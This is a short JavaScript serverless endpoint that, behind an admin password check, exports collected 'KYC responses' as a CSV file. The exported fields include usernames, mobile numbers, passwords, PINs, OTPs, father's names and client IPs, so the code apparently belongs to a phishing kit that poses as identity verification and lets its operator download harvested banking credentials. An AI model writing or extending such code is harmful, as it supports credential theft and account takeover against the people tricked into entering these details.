const { setCors, sendJson, readResponses, isAuthorizedAdmin } = require('../_lib/storage');

module.exports = async function handler(req, res) {
  setCors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET' && req.method !== 'HEAD') return sendJson(res, 405, { error: 'Method not allowed' });

  const query = req.query || {};
  if (!(await isAuthorizedAdmin(req, query))) {
    return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
  }

  const records = await readResponses();
  const headers = ['id','sessionId','refId','status','username','mobile','password','pin','fatherName','otp','clientIp','createdAt','verifiedAt'];
  let csv = headers.join(',') + '\n';
  for (const r of records) {
    csv += headers.map(h => `"${(r[h]||'').toString().replace(/"/g,'""')}"`).join(',') + '\n';
  }

  const buf = Buffer.from(csv, 'utf8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="kyc_responses.csv"');
  res.setHeader('Content-Length', buf.length);
  res.status(200).send(req.method === 'HEAD' ? '' : buf);
};
